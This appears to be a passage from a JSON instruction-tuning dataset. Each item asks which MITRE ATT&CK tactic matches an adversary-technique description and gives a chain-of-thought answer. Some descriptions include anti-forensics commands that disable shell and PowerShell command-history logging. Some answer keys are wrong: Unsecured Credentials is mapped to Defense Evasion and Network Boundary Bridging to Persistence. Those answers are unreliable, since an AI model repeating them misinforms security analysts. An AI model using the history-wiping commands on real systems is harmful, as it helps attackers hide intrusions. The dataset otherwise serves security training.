[
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.\n\nOnce malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.?",
    "context": "",
    "output": "The given description is related to sub technique Outlook Forms (T1137.003);\nSub technique Outlook Forms (T1137.003) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.\n\nOnce malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.",
      "answer": "The given description is related to sub technique Outlook Forms (T1137.003);\nSub technique Outlook Forms (T1137.003) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.?",
    "context": "",
    "output": "The given description is related to sub technique Malware (T1587.001);\nSub technique Malware (T1587.001) is a type of technique Develop Capabilities (T1587);\nTechnique Develop Capabilities (T1587) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.",
      "answer": "The given description is related to sub technique Malware (T1587.001);\nSub technique Malware (T1587.001) is a type of technique Develop Capabilities (T1587);\nTechnique Develop Capabilities (T1587) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment. An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.",
    "context": "",
    "output": "The given description is related to sub technique Container API (T1552.007);\nSub technique Container API (T1552.007) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment. An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.",
      "answer": "The given description is related to sub technique Container API (T1552.007);\nSub technique Container API (T1552.007) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \u201cunauthorized app\u201d and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. Exploitation for Defense Evasion), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using Drive-by Compromise.",
    "context": "",
    "output": "The given description is related to sub technique Gatekeeper Bypass (T1553.001);\nSub technique Gatekeeper Bypass (T1553.001) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \u201cunauthorized app\u201d and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. Exploitation for Defense Evasion), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using Drive-by Compromise.",
      "answer": "The given description is related to sub technique Gatekeeper Bypass (T1553.001);\nSub technique Gatekeeper Bypass (T1553.001) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).?",
    "context": "",
    "output": "The given description is related to sub technique: Network Trust Dependencies (T1590.003);\nSub technique Network Trust Dependencies (T1590.003) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Trusted Relationship).",
      "answer": "The given description is related to sub technique: Network Trust Dependencies (T1590.003);\nSub technique Network Trust Dependencies (T1590.003) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).?",
    "context": "",
    "output": "The given description is related to sub technique: Network Security Appliances (T1590.006);\nSub technique Network Security Appliances (T1590.006) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).",
      "answer": "The given description is related to sub technique: Network Security Appliances (T1590.006);\nSub technique Network Security Appliances (T1590.006) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. \n\nAdversaries may invoke processes using `nohup`, PowerShell `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups. This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\n\nHiding from process interrupt signals may allow malware to continue execution, but unlike Trap this does not establish Persistence since the process will not be re-invoked once actually terminated.",
    "context": "",
    "output": "The given description is related to sub technique: Ignore Process Interrupts (T1564.011);\nSub technique Ignore Process Interrupts (T1564.011) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. \n\nAdversaries may invoke processes using `nohup`, PowerShell `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups. This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\n\nHiding from process interrupt signals may allow malware to continue execution, but unlike Trap this does not establish Persistence since the process will not be re-invoked once actually terminated.",
      "answer": "The given description is related to sub technique: Ignore Process Interrupts (T1564.011);\nSub technique Ignore Process Interrupts (T1564.011) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.",
    "context": "",
    "output": "The given description is related to sub technique: Non-Standard Encoding (T1132.002);\nSub technique Non-Standard Encoding (T1132.002) is a type of technique Data Encoding (T1132);\nTechnique Data Encoding (T1132) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.",
      "answer": "The given description is related to sub technique: Non-Standard Encoding (T1132.002);\nSub technique Non-Standard Encoding (T1132.002) is a type of technique Data Encoding (T1132);\nTechnique Data Encoding (T1132) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.\n\nAdversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. <code>no logging</code>).?",
    "context": "",
    "output": "The given description is related to sub technique Impair Command History Logging (T1562.003);\nSub technique Impair Command History Logging (T1562.003) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.\n\nAdversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. <code>no logging</code>).",
      "answer": "The given description is related to sub technique Impair Command History Logging (T1562.003);\nSub technique Impair Command History Logging (T1562.003) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.\n\nOne implementation of DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.?",
    "context": "",
    "output": "The given description is related to sub technique: DNS Calculation (T1568.003);\nSub technique DNS Calculation (T1568.003) is a type of technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.\n\nOne implementation of DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.",
      "answer": "The given description is related to sub technique: DNS Calculation (T1568.003);\nSub technique DNS Calculation (T1568.003) is a type of technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.?",
    "context": "",
    "output": "The given description is related to sub technique Compromise Hardware Supply Chain (T1195.003);\nSub technique Compromise Hardware Supply Chain (T1195.003) is a type of technique Supply Chain Compromise (T1195);\nTechnique Supply Chain Compromise (T1195) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
      "answer": "The given description is related to sub technique Compromise Hardware Supply Chain (T1195.003);\nSub technique Compromise Hardware Supply Chain (T1195.003) is a type of technique Supply Chain Compromise (T1195);\nTechnique Supply Chain Compromise (T1195) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities?",
    "context": "",
    "output": "The given description is related to sub technique: Network Address Translation Traversal (T1599.001);\nSub technique Network Address Translation Traversal (T1599.001) is a type of technique Network Boundary Bridging (T1599);\nTechnique Network Boundary Bridging (T1599) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
      "answer": "The given description is related to sub technique: Network Address Translation Traversal (T1599.001);\nSub technique Network Address Translation Traversal (T1599.001) is a type of technique Network Boundary Bridging (T1599);\nTechnique Network Boundary Bridging (T1599) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>System.ComponentModel.RunInstaller(true)</code>.",
    "context": "",
    "output": "The given description is related to sub technique: InstallUtil (T1218.004);\nSub technique InstallUtil (T1218.004) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>System.ComponentModel.RunInstaller(true)</code>.",
      "answer": "The given description is related to sub technique: InstallUtil (T1218.004);\nSub technique InstallUtil (T1218.004) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via Phishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors. Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: Search Engines, breach dumps, code repositories, etc.). Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: External Remote Services or Valid Accounts).?",
    "context": "",
